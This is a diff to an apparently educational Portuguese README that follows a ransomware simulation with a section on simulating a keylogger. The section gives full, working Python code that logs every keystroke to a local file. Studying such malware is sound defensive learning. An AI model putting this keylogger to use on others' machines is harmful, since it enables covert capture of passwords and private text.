@@ -115,3 +115,51 @@ if __name__ == '__main__':
 Após executado o código criado, automaticamente é reestabelecido o acesso aos arquivos.txt, pois foram descriptografados com a chave gerada no momento da criptografia.
 
 Importante observar e alertar sobre os métodos de Engenharia Social, que fazem com que as pessoas caiam em ataque Ransomware, assim como os links maliciosos, instalações de jogos crackeados, anexos falsos por email e scripts maliciosos dentro de arquivos aparentemente inofensivos. Assim, estará prevenindo que ocorram ataques como esse.
+
+## Simulando a execução de um Keylogger
+
+Será criado um programa via Python em que se registre as teclas utilizadas pelo usuário após a execução do programa, ignorando as teclas preestabelecidas (CTRL, SHIFT, ALT, CAPSLOCK etc), para que não fique poluído o arquivo.txt onde será armazenado o registro. Vejamos:
+
+```python
+from pynput import keyboard
+
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd
+}
+
+def on_press(key):
+    try:
+        # se for uma tecla "normal" (letra, número, símbolo)
+       
+        with open("log.txt", "a", encoding="utf-8") as f:
+            f.write(key.char)     
+    except AttributeError:
+         with open("log.txt", "a", encoding="utf-8")as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.tab:
+                f.write("\t")
+            elif key == keyboard.Key.backspace:
+                f.write(" ")
+            elif key == keyboard.Key.esc:
+                f.write(" [ESC] ")
+            elif key in IGNORAR:
+                pass
+            else:
+                f.write(f"[{key}] ")
+         
+
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+```
+Assim, após executado o arquivo keylogger.py, será criado automaticamente um arquivo "log.txt", onde será armazenada todas as teclas que o usuário pressionar, enquanto estiver rodando o programa.
+
